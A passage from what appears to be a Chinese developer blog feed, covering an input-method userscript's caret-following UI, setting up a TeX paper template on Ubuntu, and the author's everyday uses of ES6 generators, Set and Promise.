<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> curStart = tt.selectionStart;</span><br><span class="line"><span class="keyword">var</span> curEnd = tt.selectionEnd;</span><br><span class="line"><span class="keyword">var</span> selectedText = imePop.querySelector(<span class="string">'ol'</span>).children[index].textContent; <span class="comment">// 这个是选中的词语</span></span><br><span class="line">tt.value = tt.value.substring(<span class="number">0</span>, curStart) + selectedText + tt.value.substring(curEnd, tt.value.length);</span><br><span class="line">tt.selectionStart = curStart + selectedText.length;</span><br><span class="line">tt.selectionEnd = curStart + selectedText.length;</span><br></pre></td></tr></table></figure>
<h3 id="输入法UI跟随">输入法UI跟随</h3><p>好的输入法，应该时刻跟随在输入光标附近。我们不希望输入法UI一直在屏幕最上方而是能够一直跟随在光标位置附近。</p>
<p>遗憾的是，并没有什么好的方法能定位光标相对于文本框的位置。好在天才灵动的前端人有的是<a href="https://github.com/component/textarea-caret-position/blob/master/index.js" target="_blank" rel="external">黑魔法</a>。简单来说，就是添加一个不可见的<code>div</code>，将<code>textarea</code>的属性复制过去使他们几何上看上去一样。在把光标位置之前文本复制过去，在文本之后加入一个<code>span</code>标签，获取这个<code>span</code>标签相对与该<code>div</code>位置，也就获得了光标相对于文本框的位置。当然位置获取后就把这个镜像<code>div</code>删除掉了。</p>
<p>接下来，<a href="http://www.quirksmode.org/js/findpos.html" target="_blank" rel="external">根据光标相对文本框的位置可以计算出光标相对于文档(<code>document.body</code>)的位置</a>，依此我们可以设置输入法UI插入到文档内并设置绝对位置(<code>absolute</code>)。</p>
<p>这样就实现了输入法UI跟随输入光标。</p>
<h3 id="智能边界">智能边界</h3><p>我再之前提到的<a href="http://reverland.org/javascript/2015/11/17/greasemonkey-userscript/">取词Userscript脚本</a>中使用了这项功能，而实际上呢，这个东西来源于几个月前跟着《30天实现操作系统》写操作系统界面处理拖动窗口时的实践。</p>
<p>话说，很多次面试我都说我写了个操作系统玩，然后面试官就睁大眼睛那我问问你进程管理，我说啥叫进程管理，然后就没有然后了。。。做了没什么卵用的东西挺多，但是，那里学到的处理窗口在边界的方法倒真用上了。顺便一说facebook的react虚DOM，应该对看过《30天瞎逼写操作系统》的同学也很眼熟。</p>
<p>说得这么高大上，实际上就是如果检测到界面超出窗口范围就平移到窗口内。233</p>
<p>获取元素相对viewport位置参考<a href="http://devdocs.io/dom/element/getboundingclientrect" target="_blank" rel="external">getBoundingClientRect</a>，我昨天在<a href="http://eloquentjavascript.net/13_dom.html" target="_blank" rel="external">Eloquent Javascript</a>中看到了这个。当然，也许你不想插入元素之后再获取位置再变更位置，我目前也不知道怎样已知相对文档位置判断相对viewport位置。劳烦熟悉的、专业的朋友在评论中给我指正。(也许得减下<code>pageYOffset</code>吧，我猜233)</p>
<p>另外，如果你监听鼠标或触摸事件，那个事件有个<code>clientX</code>和<code>clientY</code>属性也是相对于viewport。比如取词的场景中，监听到鼠标按键弹起，判断在<code>clientX</code>和<code>clientY</code>位置生成一个弹出框会不会超出viewport范围(也许是<code>window.innerWidth</code>和<code>window.innerHeight</code>)，这样也能实现在边界的智能平移行为。</p>
<p>其实输入法脚本中还没实现这个。我感觉<a href="http://stackoverflow.com/questions/21064101/understanding-offsetwidth-clientwidth-scrollwidth-and-height-respectively" target="_blank" rel="external">这些API挺乱</a></p>
<h3 id="现实并不简单">现实并不简单</h3><p>事件绑定冲突。考虑以下情况：</p>
<ol>
<li>比如devdocs这种网页应用，网页在body或者哪里绑定了按键监听，并且不让接下来的元素捕获了。</li>
<li>网页神奇的用DOM level1的方式比如<code>textarea1.onkeydown = function(e){console.log(&quot;233，失效了吧&quot;)}</code>来监听</li>
<li>简书这种根据用户交互用js操作页面的，忽然出现了一个textarea然而我们输入法只在第一次页面加载时在输入框上绑定。</li>
<li>知乎这种页面，输入框并不是textarea或者input，而是div你敢信。。。</li>
</ol>
<p>总之，真正一个跨页面可用程序，大概各种监听DOM变化，启发式搜索输入框，对事件绑定进行重排等等黑魔法，这。。。就不在本文的探讨范围内了。</p>
<p>另外，UI也最好明确指定高度宽度，不然，如果跟随内容变化，那么比如选择列表从无到有时界面会有大幅抖动，当然，UI设计和前端细节什么的，也不是我这个前端渣渣有能力讨论的了。</p>
<h2 id="思考">思考</h2><p>作为一个不务正业的非专业拉圾前端，不是professional app开发者的瞎逼写少年。我做了很多没卵用的东西，从Photomosaic生成器到仿Shodan设备搜索引擎，从拥抱machine learning的shellcode检测到项目中瞎逼搞的安全shell……等等等等。经常直接上手挑战各种根本我自己都不知道是什么的东西，缺乏专业素养也就算了，learning from the ground也就算了，写出渣一样的东西也就算了，性能优化数据结构算法都现学转眼还忘了也就算了，被当成sb也就算了，</p>
<p>但，我玩得很开心啊。</p>
<p>这世界太险恶了，不同的人有不同的用心，我这种渣号称全栈的权利都被剥夺的一干二净。有些人总绞尽脑汁想着如何能从别人身上搜刮更多，有些人则在支持帮助他人的过程中最终成就了自己。他们将各得命运，谢谢后者，去你妈的前者。</p>
<h3 id="思考和实践">思考和实践</h3><p>说说对思考与实践的关系。</p>
<p>我经常做之前没做过的事情，所以，往往觉得困难重重。在这个过程中，慢慢也磨砺了自己搜集信息和判断问题的能力。但因为没有经验，总是还会走各种弯路。</p>
<p>所以每次做完什么都想，如果动手之前我多想一想，想好了，再写就会顺利很多。不致于在一些简单的问题上挣扎很久。</p>
<p>但另一方面，你想再久，大多数问题也只会在你碰到之后才浮现出来，因为你根本就不知道你将面对什么。再多他人的经验都是浮云，要么你不理解，要么根本不符合场景，要么你碰到才想起来。除非，你就重复了下别人做过的事情，那都不一定能顺利。</p>
<p>我想，这就是人生。所以多想还是多做？永远没有答案，想、做、想、做，理论和实践螺旋上升。</p>
<p>你可以吸取他人的经验，但不可能重复他人的人生，或者你真的愿意仅仅跟随？我个人觉得，只有在摔得半死不活的时候，才能明白他人留下的经验再说什么，不然盲从经验仅仅是束缚。</p>
<p>我忽然想到毛姆在《人生的枷锁》中的观点，我想这观点也束缚了我之后几年的态度和选择，也许还会束缚未来几年甚至一生。想到这里，背后直觉一阵冷汗。</p>
<p style="color: wheat;">叹人间，美中不足今方信。</p>

<h3 id="基础知识和复杂逻辑">基础知识和复杂逻辑</h3><p>基本上，我做什么东西都是现学，强行在复杂逻辑中现学基础。</p>
<p>经常想，如果之前，我把xxx先学好了，就会少走这多少弯路了。</p>
<p>然而这是个伪命题，我没真正想做什么需要去学什么，大概也不会记得自己学过什么。顺便说自己做过的东西都因为接触太多会忘得几乎一干二净，何况那种所谓“系统学习过的呢？”。我的第一门认真学的语言是common lisp，然而在几天前兴致盎然忽然回头看之前甚至连括号之外的语法都不记得了。我都不敢相信当时还用common lisp写过web server，做过DSL，搞过人工智能网页游戏？</p>
<p>但我记得很清楚，<em>lazy evaluation</em> ，我觉得面对复杂世界的学习过程也该这样，lazy是一种策略：）</p>
<p>正如<a href="http://blog.xen0n.name/" target="_blank" rel="external">Xenon</a>那个“云破月来”的一起膜蛤的夜晚对我说的，也许你忘记的东西，都内化为自己的一部分了吧哈哈哈。</p>
<p>真正重要的，应该是学习的能力而不是知识本身。</p>
<p>我想，未来是属于掌握渔而不是掌握鱼的人。</p>
<p>再复杂的东西，不是一步一步构建的吗？不要因为某些自以为的专家搞得好像多高深似的。</p>
<p>如果你对此心存疑问，建议看看<a href="http://neuralnetworksanddeeplearning.com/" target="_blank" rel="external">Neural Network and Deep Learning</a>这本书。看看为什么很多似乎凭空而来复杂概念最初是怎么来的，看看我们人类整体面对复杂世界的无力感。也许你不做神经网络也不搞深度学习，但是它将enlighten you.</p>
<p>重要的从来不是知识，而是我们如何得到发展知识。</p>
<p>可惜估计谁也没办法考察你的这项能力。只能你自己觉得233</p>
<h3 id="Last_But_Not_Least">Last But Not Least</h3><p>有两本非常喜欢的书：《Land of Lisp》和《Eloquent Javascript》。</p>
<p>然而世人一般喜欢看两种书：</p>
<ol>
<li>21天精通xx系列</li>
<li>xx导论/xx权威指南/xx精粹/xx高级xx/你不知道的XX</li>
</ol>
<p>请自行对号入座。</p>
<p>人生苦短，我就是不看。找不到工作拉倒。我不至于因为有谁告诉我该看去看，hacking对我也不仅仅是混饭这么简单。</p>
<p>我对第二类书的作者致以崇高的敬意，但并不代表，就一定得去看什么什么的。有缘的终会有缘，该看的终会去看。</p>
<p>每次看网上有人问我想学XX，我该如何XX.都有人说你去读XX读XXfollowXX就怎样怎样。我都觉得好笑，不是笑觉得错了，而是觉得，情怀呢？</p>
<p>当然，情怀是不能当饭吃的。</p>
<p>所以，有次面试，面试官说再看看YDKJS应付面试没问题了，当时就想喷他，虽然并没有只是微笑地看着他。</p>
<p>现在喷：）<em>你当我看什么看什么写什么学什么是为了应付面试糊弄工作？</em>，你看过<a href="http://phrack.org/" target="_blank" rel="external">phrack magazine</a>么，那上面经常说，</p>
<blockquote>
<p>for fun and profit</p>
</blockquote>
<p>这些年，也积极参与了很多很多活动。但越来越反感某些活动的宣传方式。当然，只是反感而已，毕竟活动组织费心费力又费钱，他们也未必没有吹嘘的本钱。反感谁就不说了，一般这种我也不会去，我也不会有机会去。。。作为loser门票都买不起：（</p>
<p>有些另外的活动则非常喜欢，只在这里向我非常感谢的活动组织方致以谢意：红帽中国Jboss User Group、360奇舞团。感谢精彩的分享和热情的招待。</p>
<p>我想对所有能看到这里的读者说，我不相信那些声称自己多xx多xx拯救世界颠覆宇宙，离地两万英尺飞来飞去的牛皮。如果见有人声称他们多牛逼能做到别人做不到的东西，他们头上光环无数出身高贵血统优良，我想说。</p>
<p><em>我们所有人，都是平等的，一样的。只因为不同人对我们的希求不同而体现出看似不同的价值，因此体现出优秀和差劲的差别。</em></p>
<p>无论境况比他人好或坏，我们都不比他人优越和差劲。</p>
<p>引用[Eloquent Javascript]中的一句话</p>
<blockquote>
<p>I’ve often felt that some human inventions were so immensely clever and complicated that I’d never be able to understand them. But with a little reading and tinkering, such things often turn out to be quite mundane.</p>
</blockquote>
<p>所以，除了物理条件限制，没有什么别人能做到而我不可能做到。计算机是个伟大的发明，让我们在其上超越物理限制有了平等的舞台。</p>
<p>引用我经常看到的一句话：</p>
<blockquote>
<p>限制你的只有你的想象力。</p>
</blockquote>
<p>请捍卫这个平等，<a href="https://my.fsf.org/donate/" target="_blank" rel="external">支持自由软件基金会</a>。</p>
<blockquote>
<p>to preserve, protect and promote the freedom to use, study, copy, modify, and redistribute computer software, and to defend the rights of Free Software users.</p>
</blockquote>
<p>至此，这篇瞎逼扯的文章变成一篇软文233。</p>
<p>最后奉上原始版本。</p>
<p><img src="http://img.vim-cn.com/2f/d42431ca004bae8ab13fd18d15bef4d4549844.gif" alt="输入法的第一个版本"></p>
<p>写到这里好累，前前后后几个小时过去。文笔很乱也不加修改，如若能于其中有半点涟漪，也不负我在屏幕前的叹息了。</p>
<p>Have fun</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>two days’ dirty hack，很多天之前写的一个利用<a href="https://greasyfork.org/zh-CN/scripts/13193-baiducloudinput" target="_blank" rel="external">百度云输入]]>
    </summary>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在linux下使用科技论文在线TeX模板]]></title>
    <link href="http://reverland.org/linux/2015/11/23/linux-tex/"/>
    <id>http://reverland.org/linux/2015/11/23/linux-tex/</id>
    <published>2015-11-23T14:50:01.000Z</published>
    <updated>2015-11-24T16:47:57.417Z</updated>
    <content type="html"><![CDATA[<p>原文2015.10.14 14:56 <a href="http://www.jianshu.com/p/1d4c06470960" target="_blank" rel="external">首发简书</a>。</p>
<p>我看到有tex模板。我用ubuntu 14.04LTS，并不用Office</p>
<p>下载下来是一个zip文件，解压。Readme.txt乱码</p>
<p><img src="http://img.vim-cn.com/bb/627c475c9a3ec5d544ec9f5fce25f09fa98fce.png" alt="科技论文在线Tex模板README中文乱码"></p>
<p>抱着试试看的心理用 <code>iconv</code>转换</p>
<pre><code>iconv <span class="operator">-f</span> gbk -t utf8 Readme.txt
</code></pre><p>看到</p>
<p><img src="http://img.vim-cn.com/e1/d7daa7e58a0d5703e45f9fe40e64f917f43bba.png" alt="Readme里信息"></p>
<p>基于ctex宏包开发，可以用pdflatex或者xelatex。我一直用xelatex，但不想装了。</p>
<pre><code>sudo apt-get <span class="operator"><span class="keyword">install</span> texlive-lang-cjk sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> texlive-bibtex-extra</span>
</code></pre><p>首先，你得装<code>simsun.ttc</code>这个宋体Truetype字体了。还要改配置，不然找不到字体</p>
<pre><code>!pdfTeX <span class="keyword">error</span>: pdflatex (<span class="keyword">file</span> simsun.ttc): cannot <span class="keyword">open</span> TrueType font <span class="keyword">file</span> <span class="keyword">for</span> reading
</code></pre><p>配置<code>/etc/texmf/texmf.d/01csofont.cnf</code>，添加如下行(因为我的宋体安装在<code>~/.fonts</code>这里)</p>
<pre><code><span class="attribute">OSFONTDIR</span>=<span class="string">~/.fonts</span>
</code></pre><p>更新配置文件</p>
<pre><code><span class="title">sudo</span> update-texmf
</code></pre><p>编译</p>
<pre><code><span class="tag">pdflatex</span> <span class="tag">csosampleUTF8</span><span class="class">.tex</span>
</code></pre><h2 id="附记">附记</h2><p>如果你选择xelatex，就是官方推荐，注意也要更改配置文件。当然，xelatex是要安装的。</p>
<p>参考<a href="https://wiki.archlinux.org/index.php/TeX_Live_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#.E4.B8.AD.E6.96.87.E5.8C.96" target="_blank" rel="external">Archlinux维基关于TexLive中文化</a>。这部分还是我写的哈哈哈。</p>
<p>我要写论文了，have fun</p>
<h2 id="提交时的补记">提交时的补记</h2><p>今天在科技论文在线提交时，发现科技论文在线的标题关键字基金等提取有bug。如果标题或关键字等后面有注释比如<code>% some comments</code>，就不能提取出tex文件中对应内容。</p>
<p>如果发现提交不上去tex源文件，可以检查下是不是有多余的注释。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>原文2015.10.14 14:56 <a href="http://www.jianshu.com/p/1d4c06470960" target="_blank" rel="external">首发简书</a>。</p>
<p>我看到有tex模板。我用ubuntu 14.]]>
    </summary>
    
      <category term="linux" scheme="http://reverland.org/tags/linux/"/>
    
      <category term="tex" scheme="http://reverland.org/tags/tex/"/>
    
      <category term="linux" scheme="http://reverland.org/categories/linux/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[The ES6 Features I Use These Days]]></title>
    <link href="http://reverland.org/javascript/2015/11/21/the-es6-features-i-use-these-days/"/>
    <id>http://reverland.org/javascript/2015/11/21/the-es6-features-i-use-these-days/</id>
    <published>2015-11-21T15:27:27.000Z</published>
    <updated>2015-11-24T03:24:23.024Z</updated>
    <content type="html"><![CDATA[<h2 id="ES6">ES6</h2><p>ES6标准，也称ES2015。在2015年6月正式批准，这是javascript语言标准从2009年首次大版本更新。</p>
<p>这个版本带来了很多新东西，说是新东西，估计基本读者也都见过。比如python中常用的Destructuring assignment、模块导入、generator和map与set，java中的WeakHashMap、Proxy，在coffeescript中常用的class关键字与子类、模板字符串和剩余参数与默认参数等等。处处都已经有了ES6的影子。</p>
<p>最近做了几件事：</p>
<ol>
<li>把nltk中wordnet corpus reader的python代码看了看，依葫芦画瓢画了个纯javascript版。</li>
<li>热情地把<a href="http://eloquentjavascript.net/" target="_blank" rel="external">Eloquent Javascript</a>的项目和练习复习一遍，然后继续接着往下看。</li>
</ol>
<p>对此，有了两个新认识：</p>
<ol>
<li>Python是门强大的语言。特别是前几天在python中看到async关键字之后…</li>
<li>javascript是门强大的语言但并不简单，ES6让它更强大也更好用更简单</li>
</ol>
<p>这时候发现有几个地方用ES6特性非常方便。</p>
<p>本文不会解释这些特性是什么，所以，如果是查资料查到这里，略过吧。</p>
<h2 id="Generator">Generator</h2><p>在<a href="https://github.com/nltk/nltk/blob/develop/nltk/corpus/reader/wordnet.py" target="_blank" rel="external">nltk wordnet corpus</a>中，对wordnet data文件进行逐行解析的时候，这样处理一行内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_iter = iter(line.split())</span><br><span class="line">_next_token = <span class="keyword">lambda</span>: next(_iter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the lemma and part-of-speech</span></span><br><span class="line">    lemma = _next_token()</span><br><span class="line">    pos = _next_token()</span><br><span class="line">    <span class="comment"># get the number of synsets for this lemma</span></span><br><span class="line">    n_synsets = int(_next_token())</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>显然，对每一行，首先生成一个iterator，这个iterator返回这一行用空格分隔的每一个单词。好在ES6中也支持generator/iterator了，对应如下。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> token = util.getIterator(line.split(<span class="regexp">/\s+/</span>).filter(v=&gt;v!==<span class="string">''</span>));</span><br><span class="line"><span class="comment">// or let token = line.split(/\s+/).filter(v=&gt;v!=='')[Symbol.iterator]();</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">// lemma and pos</span></span><br><span class="line">  lemma = token.next().value;</span><br><span class="line">  pos = token.next().value;</span><br><span class="line">  <span class="comment">// get how many synsets for this lemma</span></span><br><span class="line">  nSynsets = <span class="built_in">parseInt</span>(token.next().value);</span><br><span class="line">  assert(nSynsets &gt; <span class="number">0</span>);</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>其中，<code>getIterator</code>定义为一个generator函数，调用这个函数则生成对应的generator，下面的<code>for...of</code>用到了<a href="http://devdocs.io/javascript/global\_objects/symbol/iterator" target="_blank" rel="external"><code>array</code>对象本身就有一个generator函数</a>的特性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">util.getIterator = <span class="function"><span class="keyword">function</span> *(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> array) &#123;</span><br><span class="line">    <span class="keyword">yield</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>nltk中生成ngram的方法的js实现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">ngrams</span>(<span class="params">sequence, n</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Sadly, you cant use arrow function as generator here.</span></span><br><span class="line">  <span class="keyword">let</span>  g = (<span class="function"><span class="keyword">function</span> *(<span class="params">sequence</span>)</span>&#123;<span class="keyword">yield</span> *sequence&#125;)(sequence);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> history = [];</span><br><span class="line">  <span class="keyword">while</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    history.push(g.next().value);</span><br><span class="line">    n--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> g) &#123;</span><br><span class="line">    history.push(item);</span><br><span class="line">    <span class="comment">// look out here.</span></span><br><span class="line">    <span class="comment">// yield history; will yield reference.</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="built_in">Array</span>.from(history);</span><br><span class="line">    history.shift();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Collections">Collections</h2><p>当我尝试用js实现<a href="http://www.matrix67.com/blog/archives/5044" target="_blank" rel="external">matrix67几年前在其博客讲到的新词发现算法</a>时，需要把一个穷举一个序列的所有分割可能。我这样实现的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splitSet</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> *<span class="title">_splitAll</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">yield</span> s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">      <span class="keyword">let</span> left = s.substr(<span class="number">0</span>, i);</span><br><span class="line">      <span class="keyword">let</span> right = s.substr(i);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> wl <span class="keyword">of</span> _splitAll(left)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> wr <span class="keyword">of</span> _splitAll(right)) &#123;</span><br><span class="line">          <span class="keyword">yield</span> wl + <span class="string">" "</span> + wr;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> set = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> w <span class="keyword">of</span> _splitAll(s))&#123;</span><br><span class="line">    set.push(w);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想得很好，通过将序列分为左右两部分递归简化处理。结果发现同一分割出现了多词。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#62; splitSet(&#34;abc&#34;)&#10;[ &#39;abc&#39;, &#39;a bc&#39;, &#39;a b c&#39;, &#39;ab c&#39;, &#39;a b c&#39; ]</span><br></pre></td></tr></table></figure>
<p>相同的结果需要排除，这时候ES6中的<code>Set</code>就很方便了…</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> w <span class="keyword">of</span> _splitAll(s))&#123;</span><br><span class="line">  set.add(w);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> set;</span><br></pre></td></tr></table></figure>
<h2 id="Promise">Promise</h2><p>事实上，任何能使用Promise+Generator的地方我都会用，当然ES7中有了async和await关键字。比如在<a href="https://greasyfork.org/en/scripts/12758-youdaodict" target="_blank" rel="external">youdaodict Userscript</a>中实现调用audio API来播放有道mp3音频文件<a href="stackoverflow.com/questions/28554022/how-can-i-play-sound-with-a-greasemonkey-script-in-firefox-when-theres-a-conte">实现跨域发音的函数</a>.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params">word</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//console.log("[DEBUG] PLAYOUND")</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">playSound</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> source = context.createBufferSource();</span><br><span class="line">    source.buffer = buffer;</span><br><span class="line">    source.connect(context.destination);</span><br><span class="line">    source.start(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> context = <span class="keyword">new</span> AudioContext()</span><br><span class="line">  <span class="keyword">var</span> soundUrl = <span class="string">`https://dict.youdao.com/dictvoice?type=2&amp;audio=<span class="subst">$&#123;word&#125;</span>`</span></span><br><span class="line">  <span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ret = GM_xmlhttpRequest(&#123;</span><br><span class="line">      method: <span class="string">"GET"</span>,</span><br><span class="line">      url: soundUrl,</span><br><span class="line">      responseType: <span class="string">'arraybuffer'</span>,</span><br><span class="line">      onload: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          context.decodeAudioData(res.response, <span class="function"><span class="keyword">function</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">            resolve(buffer);</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          reject(e);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  p.then(playSound, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般的观点是，凡是关系到异步返回值的时候，都应该尽量使用Promise，保证<a href="https://github.com/getify/You-Dont-Know-JS/blob/master/async%20&amp;%20performance/ch3.md" target="_blank" rel="external">回调只被执行一次、更好的错误处理、更明晰的流程结构</a>。</p>
<p>Promise和Generator现在常作为将来ES7中<code>async/await</code>的过渡。比如著名的<code>co</code>模块，以下是一个简化<code>co</code>实现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">co</span>(<span class="params">g</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> it = g.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (result.done)</span><br><span class="line">        <span class="keyword">return</span> result.value;</span><br><span class="line">      <span class="keyword">return</span> result.value.then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> handle(it.next(res))</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> handle(it.next())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说，就是对<code>generator</code>中每个<code>yield</code>出一个promise时，检查这个promise是否已经完成，<br>完成就返回值。没有就在该promise上注册回调让其把完成后的值传回<code>generator</code>并等待<code>generator</code>再返回下一个Promise。</p>
<p>好绕是不是?我跑题了抱歉。</p>
<h2 id="Template_String">Template String</h2><p>其实上面的例子已经用到这个特性了。再举个例子，Coffeescript中可以这样写正则：</p>
